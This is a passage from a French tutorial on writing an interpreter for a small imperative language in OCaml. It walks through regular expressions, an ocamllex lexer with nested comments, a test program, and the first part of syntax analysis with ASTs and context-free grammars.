ce n'est pas grave : vous comprendrez vraiment une fois quue nous aurons réalisé chacune de ces composantes. Il est simplement important de retenir que l'interprétation se fera en 3 étapes, qui ont chacune un rôle bien précis et qui agissent sur le résultat de l'étape précédente. L'analyse lexicale Mots, lexèmes et découpage Il est maintenant temps de commencer la réalisation de notre interpréteur. Comme nous l'avons vu plus haut, la première étape est celle de l'analyse lexicale, qui consiste à découper notre code source en « mots » de notre langage. Plus exactement, l'analyseur lexical (on entend souvent le terme anglais lexer ) va prendre en entrée une chaîne de caractères, qui sera notre code source, et produire en sortie une suite de « lexèmes » (les anglophones vous parleront de tokens ), qui seront les « mots » ou « unités lexicales » de notre langage. Les lexèmes seront tout simplement définis par un type énuméré : type token = | True | False | Not | And | Or | Greater | Equal | LeftPar | RightPar | LeftCurly (* { *) | RightCurly (* } *) | Affect (* := *) | If | While | Print | Plus | Times | Minus | Int of int | Var of string | Eof (* Fin de fichier *) Par exemple, au code suivant : while n > 0 { n := n - 1 } Correspondra la liste de lexèmes suivantes : [While; Var \"n\"; Greater; Int 0; LeftCurly; Var \"n\"; Affect; Var \"n\"; Minus; Int 1; RightCurly; Eof] Remarquez qu'on n'a pas défini de lexème pour nos commentaires : en effet, on les retirera du code à traiter dès l'analyse lexicale, pour ne plus avoir à s'en préoccuper après. Nous connaissons donc l'ensemble de nos lexèmes. Il nous faut maintenant écrire les correspondances avec les chaînes de caractères de notre code source. On pourrait imaginer écrire une simple fonction, prenant comme argument un chaîne de caractères, et renvoyant le lexème correspondant. Pour certains, ça fonctionnerait très bien : par exemple ​\"while\"​ se convertit très simplement en While . Mais comment ferait-on pour les variables par exemple ? On ne peut évidemment pas écrire un cas pour chaque nom de variable possible, puisqu'il y en a une infinité… En fait, il faut trouver un moyen de décrire les chaînes de caractères « qui sont une suite de lettres ou de chiffres commençant par une lettre ». Idem pour les nombres : un entier, c'est « une suite de chiffres ». Alors bien sûr, on pourrait encore une fois écrire une fonction qui indique si une chaîne de caractère correspond bien au motif d'une variable. Ça marcherait plus ou moins, et on pourrait s'en tirer honorablement pour trouver le lexème correspondant à un bout de chaîne donné. Mais on n'est pas plus avancé : comment savoir quelle partie du code source fournir à cette fonction pour déterminer le lexème en question ? Si mon code est resultat := resultat + 4 , comment décider si le prochain lexème à analyser correspondra à resultat , r ou resultat : ? Les expressions rationnelles La solution à ce double problème existe environ depuis les années 1940 (!!), et elle s'appelle « expressions rationnelles ». Vous en avez peut-être déjà entendu parler (on les appelle parfois « expressions régulières », ou « regex » en anglais) : c'est à la fois un objet théorique intéressant à étudier, et un outil pratique qui est très puissant lorsqu'on s'en sert correctement mais que les programmeurs d'aujourd'hui ont tendance à utiliser pour tout et n'importe quoi. Du coup, on en retrouve beaucoup de versions mutantes à des endroits où elles ne devraient pas être et où elles compliquent beaucoup le code et sa maintenance, et c'est probablement ce à quoi elles doivent leur réputation assez sulfureuse auprès de nombreux programmeurs. La théorie des expressions rationnelles n'est pas spécialement compliquée mais est trop longue pour entrer entièrement dans cet article. J'en ferai tout de même une présentation rapide, mais je vous encourage vivement à vous renseigner dessus par vous-mêmes, ne serait-ce que parce que ça fait partie du bagage culturel que vous devriez posséder. Pour ceux qui connaissent déjà les expressions régulières, il est important que vous lisiez quand même cette partie : la syntaxe que nous utiliserons diffère légèrement des syntaxes « classiques » que vous connaissez peut-être (qu'on rencontre par exemple avec Python, Perl ou sed). La première chose que vous devrez retenir concernant les expressions régulières, c'est qu'une expression régulière est un « objet » informatique (dans le sens « un truc », ça n'a pas de rapport direct avec la programmation objet) qui va servir à « décrire » des chaînes de caractères qui correspondent à un certain « motif ». L'expression régulière la plus simple a justement la forme d'une chaîne de caractères, et elle décrit la chaîne correspondante. Par exemple, l'expression régulière ​\"we don't need no thought control\"​ décrira la chaîne de caractères ​\"we don't need no thought control\"​ . Ces expressions-chaînes de caractères suivent les mêmes règles que les chaînes de caractères d'OCaml. Par exemple, l'expression ​\"\\n\"​ décrira une chaîne de caractères ne contenant qu'un retour à la ligne. J'attire ici l'attention de ceux qui ont déjà joué avec des expressions régulières : ​\"a*\"​ , par exemple, décrira la chaîne de caractères ​\"a*\"​ , et pas par exemple la chaîne ​\"aaaaa\"​ (si vous ne comprenez pas pourquoi je dis ça, ignorez simplement cette phrase pour l'instant). Si votre expression régulière-chaîne de caractères ne contient qu'un seul caractère, vous pouvez l'écrire en suivant la syntaxe du type char d'OCaml : ainsi, ​'a'​ décrira la chaîne ​\"a\"​ . Si vous souhaitez décrire plusieurs chaînes différentes, vous pourrez utiliser un caractère spécial des expressions régulières : le tube | . Il s'interpose simplement entre deux expressions régulières, et l'expression globale obtenue décrit toutes les chaînes décrites soit par la première, soit par la seconde sous-expression. Ainsi, l'expression régulière ​\"mer\" | \"montagne\"​ décrira les chaînes de caractères ​\"mer\"​ et ​\"montagne\"​ . Vous pouvez regrouper ainsi plusieurs expressions : ​\"mer\" | \"montagne\" | \"lagon\"​ décrira les 3 chaînes de caractères que vous devinez. Vous pouvez coller deux expression régulières l'une après l'autre : ​\"côté \" (\"mer\" | \"montagne\") décrira les deux chaînes ​\"côté mer\"​ et ​\"côté montagne\"​ . Vous aurez remarqué l'usage des parenthèses pour gérer les priorités : la concaténation de deux expressions régulières est prioritaire sur l'union | . Le deuxième caractère spécial est l'étoile * (non, elle ne s'appelle pas astérisque quand on parle d'expressions rationnelles). Elle s'appose après une expression régulière, pour décrire 0 ou plusieurs occurrences de cette expression. Ainsi, ​\"na\"* décrira les chaînes ​\"\"​ , ​\"na\"​ , ​\"nananana\"​ … Vous pouvez bien sûr combiner plusieurs des constructions que nous avons vues : ​\"na\"* \" \"(\"bat\" | \"spider\") \"man\"​ décrira les chaînes ​\"nanananana batman\"​ , ​\"na spiderman\"​ … Le caractère spécial + fonctionne de la même façon que l'étoile, mais sert à faire correspondre une ou plusieurs occurrences de l'expression à laquelle il est appliqué (autrement dit, il ne permet pas de décrire la chaîne vide ​\"\"​ ). Le caractère ? fait lui correspondre 0 ou 1 occurrence. Un concept important pour nos expressions régulières est celui de « classe ». Une classe est un ensemble d'expressions-caractères (par exemple, ​'a'​ ) entre crochets, éventuellement composée aussi de nouveaux symboles spéciaux. Sans ceux-ci, c'est une autre façon d'écrire une union : ['a' 'e' 'i' 'o' 'u' 'y'] est équivalent à (\"a\" | \"e\" | \"i\" | \"o\" | \"u\" | \"y\") . On peut utiliser le caractère spécial &#94; juste après le crochet ouvrant pour faire la négation d'une classe : [&#94; '\\n'] décrira toutes les chaînes, sauf celles composées uniquement d'un retour à la ligne. Enfin, on peut utiliser le caractère tiret - pour décrire une série de caractères « compris » entre deux : ['a' - 'e'] décrira ​\"a\"​ , ​\"b\"​ , ​\"c\"​ , ​\"d\"​ et ​\"e\"​ . Une fois que vous saurez que le caractère spécial _ peut servir, un peu comme dans les match d'OCaml, à décrire n'importe quelle chaîne, vous connaîtrez tout des expressions régulières (enfin, non, ce n'est pas vrai. Mais vous en connaîtrez suffisamment pour ce qui nous concerne. Je vous engage toutefois vivement à vous renseigner un peu plus en détail dessus). Ocamllex Le commencement Nous avons maintenant notre outil théorique qui nous permettra de découper notre code en unités lexicales. Reste à savoir comment l'utiliser en pratique. Bien sûr, nous pourrions implémenter nous-mêmes notre moteur d'expressions régulières et l'analyseur syntaxique qui va avec. C'est d'ailleurs un travail intéressant que je vous encourage à faire quand vous maîtriserez le sujet. L'ennui, c'est que ça demande beaucoup de travail alors qu'il y a des outils tout prêts. Celui que nous utiliserons pour nous simplifier la vie s'appelle ocamllex . C'est un « générateur d'analyseur lexical » : à partir d'un ensemble de règles associant des expressions régulières aux lexèmes qu'ils décrivent, il génère une fonction OCaml qui permet, à partir d'un code source, de générer la suite de lexèmes correspondant. Ocamllex est fourni avec l'installation standard d'OCaml, pas besoin donc d'installation supplémentaire. Vous pouvez vérifier qu'il est bien disponible sur votre machine en tapant la commande ocamllex , qui devrait vous afficher la liste des options disponibles. Avant de commencer, reprenez le type énuméré des lexèmes que nous avons défini plus haut, et écrivez-le dans un fichier tokens.ml . Pour rappel, ce type était : type token = | True | False | Not | And | Or | Greater | Equal | LeftPar | RightPar | LeftCurly (* { *) | RightCurly (* } *) | Affect (* := *) | If | While | Print | Plus | Times | Minus | Int of int | Var of string | Eof (* Fin de fichier *) Notre analyseur lexical se servira de ce fichier pour connaître les différents lexèmes qu'il est susceptible de produire. Par convention, notre code ocamllex s'écrit dans un fichier *.mll. Créez donc un fichier que vous appellerez par exemple « lexer.mll ». Il est maintenant temps d'écrire notre analyseur. Quand vous écrivez du code OCaml, l'élément principal est une fonction : let ma_fonction = function | antécédent1 -> résultat1 | antécédent2 -> résultat2 Le code Ocamllex ressemble un peu à ça. L'élément principal s'appelle une règle, les antécédents sont des expressions régulières et les résultats sont les lexèmes correspondants. La syntaxe est la suivante : rule ma_règle = parse | expression1 { Lexeme1 } | expression2 { Lexeme2 } À partir de ces différentes correspondances, ocamllex construira une fonction OCaml (dont nous verrons le type exact plus tard) qui, à partir d'un code donné, renvoie le lexème suivant (et retire les caractères correspondants du code). Pour qu'il puisse connaître les lexèmes, il faut que le type ait été déclaré quelque part, comme dans un fichier OCaml classique. Pour cela, OCamllex permet d'écrire du code OCaml en tête de fichier, entre accolades. Les mots-clefs Voyons ça tout de suite en pratique avec la règle qui analyse tous les mots réservés de notre langage : { open Tokens exception LexingError } rule lexer = parse | eof { Eof } | \"true\" { True } | \"false\" { False } | \"not\" { Not } | \"and\" { And } | \"or\" { Or } | \"if\" { If } | \"while\" { While } | \"print\" { Print } | \"(\" { LeftPar } | \")\" { RightPar } | \"{\" { LeftCurly } | \"}\" { RightCurly } | \"+\" { Plus } | \"*\" { Times } | \"-\" { Minus } | \">\" { Greater } | \"​=​\" { Equal } | \":=​\" { Affect } Vous remarquerez qu'on ouvre en tête le fichier le module Tokens, qui correspond donc au fichier tokens.ml écrit plus haut. On définit également une exception LexingError qui nous servira plus tard en cas d'erreur lexicale. En plus des quelques mots réservés de notre langage, vous avez remarqué la présence de l'antécédent eof . C'est un mot-clef OCamllex qui indique la fin de fichier : il est important de renvoyer le lexème correspondant, que nous avons appelé Eof , sinon vous aurez des problèmes lors de la phase d'analyse syntaxique (qui ne saura pas bien s'arrêter). Le reste du code est assez simple pour être compris sans commentaires. Les nombres, la première loi et les alias Passons maintenant aux nombres. Comme nous l'avons vu plus haut, nous ne gèrerons que des nombres entiers, qui seront donc une suite d'un ou plusieurs chiffres, un chiffre étant compris entre ​'0'​ et ​'9'​ pour l'ordre des caractères. Ça tombe bien, nous savons décrire ces caractères, et nous savons aussi comment exprimer \"1 ou plusieurs\". L'expression régulière permettant de décrire nos nombres est donc, si vous avez bien suivi, ['0' - '9']+ . Il nous reste donc à écrire le lexème produit. Pour cela, OCamllex nous permet de désigner la chaîne de caractères correspondante à l'aide du mot-clef as . Nous écrirons donc : rule lexer = parse | ... | ['0' - '9']+ as n { Int (int_of_string n) } Notez donc l'utilisation du as , et n'oubliez pas de convertir la chaîne n en entier : notre lexème Int attend en effet un paramètre de type int . Un premier problème se pose ici : notre analyseur reconnaît, pour les nombres, une suite de 1 ou plusieurs chiffres. Comment savoir où il va s'arrêter ? Par exemple, si notre code contient a := 123 et qu'il en est au 123 , comment saura-t-il s'il doit traduire 1 , 12 ou 123 ? La solution à ce problème est apportée par la loi de la plus longue correspondance. C'est la première loi que suivra notre analyseur en cas d'ambiguité : comme son nom l'indique, elle précise que la chaîne de caractères correspondant au lexème produit à une certaine étape est toujours la plus longue que l'anayseur lexical peut reconnaître à cette étape. Ainsi, dans l'exemple précédent, la chaîne reconnue était 123 . Cette loi est l'occasion pour nous de parler un (tout) petit peu du fonctionnement interne de notre analyse lexicale. À l'aide d'objets informatiques appelés automates finis, qui sont très fortement liés aux expressions rationnelles, l'analyseur parcourt chaque caractère de la chaîne jusqu'à ce que la sous-chaîne entre le début de la chaîne principale et le caractère courant ne puisse plus constituer le début d'une chaîne reconnue par l'automate. L'analyseur renvoie alors la dernière chaîne rencontrée qu'il reconnaissait comme correspondant à un lexème. Nous allons maintenant introduire une autre possibilité offerte par OCamllex : les alias. Ils permettent de nommer des expressions régulières afin de s'en resservir par la suite sans avoir à les réécrire à chaque fois. En plus du gain de place pour des grosses expressions souvent réutilisées, ils permettent souvent d'améliorer la lisibilité. Ici, nous allons définir un alias « chiffre ». On utilise pour cela le mot-clef let , comme en OCaml, et on déclare l'alias avant son utilisation (donc ici entre le code OCaml initial et notre règle). Voilà donc l'état actuel de notre fichier : { open Parser exception LexingError } let digits = ['0' - '9'] rule lexer = parse | eof { Eof } | \"true\" { True } | \"false\" { False } | \"not\" { Not } | \"and\" { And } | \"or\" { Or } | \"if\" { If } | \"while\" { While } | \"print\" { Print } | \"(\" { LeftPar } | \")\" { RightPar } | \"{\" { LeftCurly } | \"}\" { RightCurly } | \"+\" { Plus } | \"*\" { Times } | \"-\" { Minus } | \">\" { Greater } | \"​=​\" { Equal } | \":=​\" { Affect } | digits+ as n { Int (int_of_string n) } Rien de très compliqué. Les variables et la deuxième loi Nous allons maintenant passer aux variables. Elles doivent commencer par une lettre (pour faire pompeux, on peut dire un « caractère alphabétique »), éventuellement suivie d'un ou plusieurs « caractères alphanumériques » (des chiffres ou des lettres, appellation qu'on rencontre plus souvent). Les lettres peuvent être en majuscule. Comme tout à l'heure, nous définissons un nouvel alias avant d'écrire notre expression régulière : let digits = ['0' - '9'] let alpha = ['a' - 'z' 'A' - 'Z'] rule lexer = parse | \"true\" { True } | alpha (alpha | digits)* as v { Var v } Les plus malins auront remarqué que nous avons ici un deuxième problème. En effet, le mot ​\"true\"​ est lui-même reconnu à la fois par l'expression régulière ​\"true\"​ , afin de produire le lexème attendu True des booléens, mais aussi par l'expression décrivant les variables. On pourrait se débrouiller pour que l'expression des variables ne décrive pas ​\"true\"​ , mais on serait obligés de faire ça pour chaque mot-clef : ce serait un travail long, compliqué, délicat, stupide, bogue-amical et déraisonnable. Si vous n'êtes pas convaincus, essayez vous-mêmes, et une semaine après, rajoutez un mot-clef à votre langage. Comme tout-à-l'heure avec la plus longue correspondance, une deuxième loi existe pour régler ce problème : la priorité à l'expression la plus haute. Elle indique qu'en cas de conflit pour une chaîne donnée, éventuellement après application de la loi de la plus longue correspondance, qui permettra par exemple de ne pas avoir de conflit sur la variable ​\"truefalse\"​ , le lexème produit est le premier placé dans la liste des correspondances du fichier OCamllex. Ainsi, en plaçant les mots-clefs avant les variables dans ce fichier, on est assuré qu'ils seront bien reconnus comme tels. Les caractères blancs La prochaine étape est la lecture des caractères blancs. Comme le montre le code-exemple du début de ce tutoriel, l'utilisateur de notre langage a la possibilité d'utiliser des caractères tels que l'espace, la tabulation ou le saut de ligne pour rendre son code plus agréable à la lecture. Même s'ils ne correspondent à aucun lexème, nous sommes obligés de les noter quelque part dans notre code OCamllex, sinon il s'arrêterait dès qu'il en rencontre un avec une erreur lexicale. Pour cela, nous utiliserons le mot clef lexbuf . Il désigne, après reconnaissance d'un mot dans le code (correspondant donc à une expression régulière), la suite des caractères de ce code. Lorsque nous rencontrons un caractère blanc, il nous suffit donc de réappeler notre lexer (qui, rappelez-vous, doit renvoyer à chaque appel le prochain lexème du code) sur ce lexbuf afin qu'il y trouve le lexème suivant. Les règles écrites en OCamllex sont automatiquement récursives, nous écrirons donc : (* On ne prendra en compte que les sauts de lignes, les tabulations et les espaces *) let empty = [ '\\n' '\\t' ' ' ] rule lexer = parse | empty + { lexer lexbuf } | ... Notez que nous avons choisi de sauter d'un coup tous les caractères blancs consécutifs (à l'aide du signe + ), mais qu'on aurait très bien pu le faire un par un. Les commentaires : une nouvelle règle Avant d'avoir un analyseur lexical complet, il ne nous reste plus qu'à gérer les commentaires. Rappelez-vous qu'ils ont la syntaxe des commentaires C : // pour commenter sur une ligne (ou une fin de ligne), et /* ... */ pour délimiter des commentaires pouvant s'étendre sur plusieurs lignes. Pour les premiers, c'est relativement simple : il nous suffit d'ignorer (comme avec les blancs) tous les caractères compris entre // et la fin de ligne ​'\\n'​ . Ces caractères peuvent être n'importe quoi… sauf eux-mêmes des sauts de lignes ! (Un bonbon pour ceux qui avaient deviné.) Je vous laisse écrire l'expression correspondante par vous-mêmes, la solution viendra plus bas avec le code OCamllex complet. Pour les commentaires multilignes, c'est un peu plus compliqué. En effet, nous ne pouvons pas nous contenter de faire correspondre un /* avec le */ suivant : nous voulons pouvoir imbriquer des commentaires, et ce à n'importe quel niveau. Par exemple, on veut pouvoir écrire : /* Premier niveau de commentaires /* Deuxième niveau /* Troisième niveau */ */ */ Inutile d'essayer d'écrire l'expression régulière permettant de décrire ces commentaires imbriqués, vous n'y arriverez pas pour la bonne et simple raison qu'elle n'existe pas. Si vous voulez connaître le mot pour briller en société, on dit que ce langage des commentaires imbriqués est « non-régulier » (ce qui correspond exactement à « non reconnaissable par une expression rationnelle/un automate » - les deux revenant au même). Nous allons donc devoir tricher un peu pour reconnaître plus de choses qu'il n'en est théoriquement possible avec nos expressions régulières. Pour cela, nous allons écrire une deuxième règle, qui sera appelée dès que l'on rencontrera un début de commentaire multiligne /* . Elle s'occupera d'ignorer tous les caractères jusqu'au */ correspondant, puis repassera la main à notre règle lexer . Afin de trouver la fermeture de commentaire correspondante, elle devra connaître le niveau de commentaire dans lequel on se trouve : si on en est au niveau (n) et qu'on arrive à un mot /* , on passe au niveau (n + 1). Si on trouve */ , on passe au niveau (n - 1). Si on était alors au premier niveau, il suffit d'appeler la règle lexer sur la suite du code : on a alors ignoré le commentaire comme prévu. La définition de cette nouvelle règle se fera avec le mot-clef and , qui encore une fois ressemble beaucoup dans son fonctionnement à celui d'OCaml. La mémorisation du niveau de commentaire pourrait se faire avec une référence utilisée dans le code OCaml des résultats (et correctement définie en tête de fichier), je vous invite d'ailleurs à le faire à titre d'exercice. Pour ce projet, j'utiliserai plutôt un argument supplémentaire passé à la règle, correspondant à la profondeur des imbrications au moment où cette règle est appelée. Lorsqu'on rencontre un /* dans lexer , on appelle donc la règle comment avec l'argument 1 (sans oublier l'argument lexbuf ). Le corps de cette règle devrait être assez simple pour vous : si on croise une ouverture ou une fermeture, on réagit comme expliqué plus haut. Si on croise une fin de fichier ( eof ), on renvoie LexingError : les commentaires multilignes devront obligatoirement être fermés correctement (on évite ainsi les erreurs étranges qui viennent d'un commentaire qu'on croyait qu'il n'était pas fermé mais qu'en fait il n'est fermé). Si on rencontre n'importe quoi d'autre (rappelez-vous de _ …), on rappelle notre règle sur la suite du code. Sans plus tarder, voilà donc le code complet de notre analyseur lexical : { open Parser exception LexingError } let digits = ['0' - '9'] let alpha = ['a' - 'z' 'A' - 'Z'] let empty = ['\\n' '\\t' ' '] rule lexer = parse | \"//\" [&#94;'\\n']* '\\n'? { lexer lexbuf } | \"/*\" { comment 1 lexbuf } | eof { Eof } | empty+ { lexer lexbuf } | \"true\" { True } | \"false\" { False } | \"not\" { Not } | \"and\" { And } | \"or\" { Or } | \"if\" { If } | \"while\" { While } | \"print\" { Print } | \"(\" { LeftPar } | \")\" { RightPar } | \"{\" { LeftCurly } | \"}\" { RightCurly } | \"+\" { Plus } | \"*\" { Times } | \"-\" { Minus } | \">\" { Greater } | \"​=​\" { Equal } | \":=​\" { Affect } | digits+ as n { Int (int_of_string n) } | alpha (alpha | digits)* as v { Var v } and comment depth = parse | \"/*\" { comment (depth + 1) lexbuf } | \"*/\" { if depth = 1 then lexer lexbuf else comment (depth - 1) lexbuf } | eof { raise LexingError } | _ { comment depth lexbuf } Vous avez donc la solution complète de la gestion des commentaires. Vous aurez peut-être remarqué la petite subtilité sur les commentaires unilignes : le saut de ligne final est facultatif. C'est pour permettre à l'utilisateur d'écrire un commentaire uniligne en fin de fichier sans avoir à terminer sa ligne finale par un saut de ligne (notez que bon, en vrai il devrait de toute façon le faire, mais ne soyons pas plus royalistes que le roy). Utilisation pratique de notre analyseur Félicitations, vous avez maintenant un analyseur lexical complet ! Il ne nous reste plus qu'à voir son utilisation pratique, et nous pourrons passer au gros mais intéressant morceau de l'analyse syntaxique. La distribution standard d'OCaml fournit un module Lexing , dédié comme son nom l'indique à l'analyse lexicale. Il fournit entre autres quelques fonctions de base permettant de construire des lexers, que vous devriez regarder un jour où vous avez un peu de temps, au moins pour la culture. Il nous intéresse parce qu'il fournit également un type lexbuf , qui doit maintenant vous dire quelque chose : il correspond à un « buffer » (un tampon en français) lexical. Ce type a un comportement ressemblant aux flux ( stream en anglais) pour ceux qui connaissent : il s'agit pour simplifier d'une liste dont la tête n'est calculée que quand on la demande explicitement (on dit que la liste est paresseuse ), et est supprimée de la liste une fois qu'on l'a produite (la liste est destructive ). Rappelez-vous, le mot-clef lexbuf d'OCamllex fonctionnait exactement de cette façon : nos règles le prenaient en argument, renvoyant le lexème correspondant au premier mot rencontré, et ce mot était retiré du « code ». Il s'agit donc d'un flux de caractères. Notre analyseur lexical produira des fonctions dont le paramètre aura ce type (en plus des éventuels paramètres supplémentaires de nos règles). Il faudra donc, à partir de notre code (qui sera contenu soit dans un fichier, soit dans une chaîne de caractères), produire une valeur de type Lexing.lexbuf . Vous vous en doutez, le module Lexing propose plusieurs fonctions pour faire ça : vous avez par exemple Lexing.from_string pour convertir une valeur de type string , ou Lexing.from_channel pour convertir une valeur de type in_channel . Pour qu'il génère ces fonctions, exécutez la commande suivante : $ ocamllex lexer.mll Ocamllex créera alors un fichier lexer.ml (vous pouvez changer le nom à l'aide de l'option -o ), qui contiendra les fonctions lexer et comment . Lexer.lexer sera donc de type Lexing.lexbuf -> Tokens.token , ce que vous aurez compris tout seul si vous avez bien suivi. En bonus, voilà un petit programme qui vous permettra de tester votre analyseur lexical (appelez-le test_lexer.ml ) : open Tokens let string_of_token = function | True -> \"True\" | False -> \"False\" | Not -> \"Not\" | And -> \"And\" | Or -> \"Or\" | Greater -> \"Greater\" | Equal -> \"Equal\" | LeftPar -> \"LeftPar\" | RightPar -> \"RightPar\" | LeftCurly -> \"LeftCurly\" | RightCurly -> \"RightCurly\" | Affect -> \"Affect\" | If -> \"If\" | While -> \"While\" | Print -> \"Print\" | Plus -> \"Plus\" | Times -> \"Times\" | Minus -> \"Minus\" | Int n -> \"Int \" &#94; string_of_int n | Var v -> \"Var \" &#94; v | Eof -> \"Eof\" let lexbuf = Lexing.from_channel (open_in Sys.argv.(1)) let rec print_code lexbuf = let t = Lexer.lexer lexbuf in print_endline (string_of_token t); if t <> Eof then print_code lexbuf let () = print_code lexbuf Compilez ce code avec : $ ocamlbuild test_lexer.native Si votre analyseur lexical a été correctement écrit, vous devriez avoir un message sans erreur. Vous pouvez ensuite le tester avec : $ ./test_lexer.native test.imp Var n Affect Int 5 Var f Affect Int 1 While Var n Greater Int 0 LeftCurly Var f Affect Var f Times Var n Var n Affect Var n Minus Int 1 RightCurly Print Var f Print Int 3 Plus Int 4 Times Int 5 Eof Ce résultat ayant été obtenu à partir du fichier test.imp suivant : // On initialise les variables n := 5 f := 1 /* boucle principale /* commentaire imbriqué */ */ while n > 0 { f := f * n n := n - 1 } print f /* On peut même print-er des expressions numériques */ print 3 + 4 * 5 Si vous n'avez pas ce résultat, il y a un problème chez vous. Si vous ne trouvez pas, vous avez tout le corrigé du code, profitez-en maintenant pour regarder ce qui ne va pas et régler ce problème. Et voilà, nous en avons terminé avec l'analyse lexicale ! Maintenant que vous n'avez plus de problème avec cette partie, nous allons pouvoir passer à l'analyse syntaxique. N'hésitez pas, comme je l'ai dit plusieurs fois, à aller regarder plus en détail la théorie des expressions rationnelles et des automates finis : c'est relativement simple, et c'est toujours intéressant (et vous comprendrez probablement mieux ce qui va suivre). L'analyse syntaxique Arbres syntaxiques Lors de la première étape, l'analyse lexicale, nous avons transformé le code source initial en une suite de lexèmes connus de notre langage. Si vous vous souvenez bien, nous allons maintenant lier ces lexèmes entre eux : nous allons former des phrases avec les mots que nous avons obtenu. Prenons un exemple simple avec le code suivant : if f > 0 { print 2 * f + 5 } En oubliant pour l'instant les lexèmes, analysons donc les rapports entre les différents mots. Intéressons-nous d'abord à l'intérieur de la condition. Nous avons un print , suivi d'une opération arithmétique. print étant un mot-clef connu de notre langage, nous savons que cette ligne sera un appel à notre fonction print , avec comme paramètre 2 * f + 5 . Notons-le de cette façon : Print (\"2 * f + 5\") . Il nous faut maintenant analyser ce paramètre pour compléter le découpage de la ligne. Il s'agit d'une opération à deux opérateurs, * et + . Nous ne pouvons donc a priori pas faire comme print , à savoir décomposer directement en une opération et son ou ses opérandes. Sauf que… nous avons les règles de priorité ! Ces règles nous disent qu'on commence par calculer 2 * f , puis qu'on ajoute 5 . Donc nous avons bien une opération, + , dont les opérandes sont 2 * 5 et f . Autrement dit, quand on a une opération faisant intervenir des * et des + , on commence par analyser l'expression * puis on prend son résultat comme opérande de + . Le résultat final de cette ligne est donc : Print(Add(Mul(2, \"f\"), 5)) . On fait pareil avec le if : on peut dire que If a deux arguments, ​\"f > 0\"​ et la ligne que nous venons d'analyser, ce qui nous donne finalement une décomposition qui, au lieu de s'écrire linéairement, se représente plus intuitivement comme l'arbre suivant : Comme vous pouvez le constater, c'est un arbre n-aire (le nombre de fils de chaque noeud n'est pas fixé - en pratique il ne dépassera pas 2 dans notre cas), où chaque « mot » de notre langage représente un noeud (ou une feuille). Il montre bien la relation entre nos mots : la portée de chacun, ses paramètres… Cet arbre particulier est appelé arbre syntaxique abstrait , qu'on abrège presque tout le temps en AST ( abstract syntax tree ). Et comme vous l'avez remarqué, à chaque noeud ou feuille de notre arbre, on trouve un mot correspondant exactement à un lexème du langage : on a donc complètement décomposé notre liste de lexèmes dans notre AST. Afin de vous assurez que vous maîtrisez le concept d'arbre syntaxique, vous avez ci-dessous l'arbre syntaxique correspondant au code de test de notre analyseur lexical (redonné pour mémoire). Assurez-vous de bien comprendre comment il est construit (ce n'est pas très compliqué, mais c'est important). Notez que Seq désigne la suite de deux instructions. Voici donc la source : // On initialise les variables n := 5 f := 1 /* boucle principale /* commentaire imbriqué */ */ while n > 0 { f := f * n n := n - 1 } print f /* On peut même print-er des expressions numériques */ print 3 + 4 * 5 Et l'arbre qui en découle : Vous pouvez remarquer que le constructeur Seq prend deux sous-AST en paramètre. On aurait aussi pu lui en faire prendre un nombre quelconque (donc une liste d'AST) : les deux solutions sont en fait à peu près équivalentes, celle que nous avons choisi revenant en fait à construire des listes avec Seq au lieu de Cons (ou :: , comme vous voulez). Il ne nous reste plus qu'à définir notre AST dans un fichier ast.ml : type command = | Affect of string * aexp | Print of aexp | If of bexp * command | While of bexp * command | Seq of command * command and aexp = | Int of int | Var of string | Minus of aexp * aexp | Neg of aexp | Plus of aexp * aexp | Times of aexp * aexp and bexp = | And of bexp * bexp | Equal of aexp * aexp | False | Greater of aexp * aexp | Not of bexp | Or of bexp * bexp | True Vous aurez remarqué qu'il est composé de 3 différents types : nous reviendrons dessus plus tard. Ils sont a priori assez explicites pour que vous n'ayiez pas besoin de plus d'explications. Les grammaires hors-contexte Maintenant que nous connaissons la forme de la sortie de notre analyseur syntaxique, il nous faut transformer notre liste de lexèmes en AST. Pour faire simple, commençons par les expressions arithmétiques. Nous allons les redéfinir plus formellement, de la façon suivante : 1. Les entiers sont des expressions arithmétiques ; 2. Les variables sont des expressions arithmétiques ; 3. Si A et B sont des expressions arithmétiques, alors A + B , A * B et A - B sont des expressions arithmétiques, avec les priorités usuelles ; 4. Si A est une expressions arithmétique, alors - A et (A) sont des expressions arithmétiques. Vous aurez remarqué que je note + pour avoir des formules plus lisibles, mais en réalité il s'agit bien du lexème Plus . Pour l'analyse lexicale, nous avons utilisé les expressions rationnelles. Comme il s'agit toujours de reconnaître certains motifs, nous pourrions être tentés de recommencer, en remplaçant les caractères par des lexèmes. Seulement, ça ne marchera pas. En effet, le langage des expressions arithmétiques est non-régulier : on ne peut pas le décrire à l'aide d'une expression régulière. En fait, on ne peut même pas écrire d'expression régulière qui décrive un mot composé de n parenthèses ouvrantes suivi de n parenthèses fermantes. Une explication « avec les mains » à cette contrainte est liée aux automates finis, qui, rappelez-vous, sont les objets permettant de faire « fonctionner » les expressions régulières. Un automate fini est composé d'un certain nombre N d'états, et il ne peut pas « retenir » plus de N caractères. Or ici, on veut pouvoir retenir un nombre arbitrairement grand de parenthèses gauches pour savoir si on a bien le bon nombre de parenthèses droites pour les fermer : il faudrait donc un automate infini , qui n'est donc associé à aucune expression rationnelle. Il nous faut donc trouver une autre forme de description de notre langage. Elle découle en fait directement de notre définition précédente : comme vous l'avez constaté, cette définition est récursive, et c'est précisément cette récursivité qui va nous permettre de nous en sortir. Écrivons donc : A: | Int | Var | A + A | A - A | A * A | - A | (A) Cette écriture, qui n'est autre que notre définition avec une syntaxe un peu plus formelle ( A désignant les expressions arithmétiques), est celle des grammaires hors-contexte . A est appelé terme de la grammaire, et les différents « cas » ( Int , A + A …) des productions . On peut comparer les grammaires hors-contexte aux expressions rationnelles, mais en plus expressif : on peut décrire (strictement) plus de choses à l'aide d'une grammaire hors-contexte qu'en utilisant des expressions rationnelles. D'ailleurs, nous allons voir que les grammaires hors-contexte « incluent » les expressions rationnelles. Pour avoir ces dernières sur un alphabet (tout à l'heure les caractères des String , ici les lexèmes), il faut avoir, en plus de ces caractères et de ε qui désigne le mot vide, 3 choses : la concaténation, l'union | et l'étoile * . Tout le reste n'est que du « sucre » : par exemple, s+ peut s'écrire comme ss* , et s? peut s'écrire comme s|ε . Sans reconstruire rigoureusement les expressions rationnelles, voyons comment nous pouvons écrire un terme qui décrit la même chose que (a|b)*ba : A: | a B: | b AorB: | A | B AorBstar: | ε | AorB AorBstar Final: | AorBstar B A Comme vous pouvez le voir, nous avons un terme ( Final ) qui décrit la même chose que notre expression rationnelle initiale. Ce qui est intéressant ici, c'est de voir comment nous avons redéfini l'étoile et le tube. Les grammaires hors-contexte 